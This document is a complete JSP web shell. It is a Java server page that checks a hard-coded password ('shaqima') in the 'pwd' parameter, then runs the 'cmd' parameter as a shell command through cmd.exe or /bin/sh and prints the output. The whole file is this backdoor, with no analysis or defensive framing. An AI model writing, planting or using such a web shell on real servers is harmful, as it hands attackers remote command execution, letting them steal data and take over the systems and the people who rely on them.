<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    if ("shaqima".equals(request.getParameter("pwd"))) {
        out.print("<pre>");
        ProcessBuilder p = null;
        String scode = request.getParameter("cmd");
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            p = new ProcessBuilder(new String[]{"cmd.exe", "/c", scode});
        } else {
            p = new ProcessBuilder(new String[]{"/bin/sh", "-c", scode});
        }
        InputStream in = p.start().getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int ret = -1;
        byte[] bs = new byte[2048];
        out.print("<pre>");
        while((ret = in.read(bs)) != -1) {
            baos.write(bs, 0, ret);
        }
        out.write("<pre>" + new String(baos.toByteArray()) + "</pre>");
    }
%>